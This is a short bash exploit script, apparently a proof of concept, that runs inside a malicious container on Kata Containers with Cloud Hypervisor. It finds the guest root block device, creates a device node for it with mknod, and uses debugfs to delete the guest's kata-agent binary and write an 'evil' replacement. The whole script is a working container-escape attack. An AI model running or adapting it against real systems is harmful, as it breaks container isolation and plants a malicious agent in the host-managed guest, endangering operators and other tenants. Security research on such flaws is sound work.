#!/bin/bash

set -e

echo -e "\t[+] In the evil container"
echo -e "\t[*] Searching for the device..."

found_clh_dev=false
for path in /sys/dev/block/* ; do
	curr_target=$(readlink $path)
	if [[ $curr_target == *"vda1"* ]]; then
    	dev=$(basename $path)
    	guest_fs_major=$(echo $dev | cut -f1 -d:)
    	guest_fs_minor=$(echo $dev | cut -f2 -d:)
    	found_clh_dev=true
    	break
    fi
done

if [ "$found_clh_dev" = false ]; then
	echo -e "\t[!] no vda1 device, not on CLH, shutting down..."
	exit 1
fi

echo -e "\t[+] Device found"
echo -e "\t[*] Mknoding..."

mknod --mode 0600 /dev/guest_hd b $guest_fs_major $guest_fs_minor

echo -e "\t[+] Mknoded successfully"
# Ok we're on CLH, let's run the attack
echo -e "\t[*] Replacing the guest kata-agent..."

cmd_file=/tmp/debugfs_cmdfile
rm -rf $cmd_file
cat <<EOF > $cmd_file
open -w /dev/guest_hd
cd /usr/bin
rm kata-agent
write /evil-kata-agent kata-agent
close -a
EOF

# Execute cmdfile 
/sbin/debugfs -f $cmd_file

echo -e "\t[+] Done"
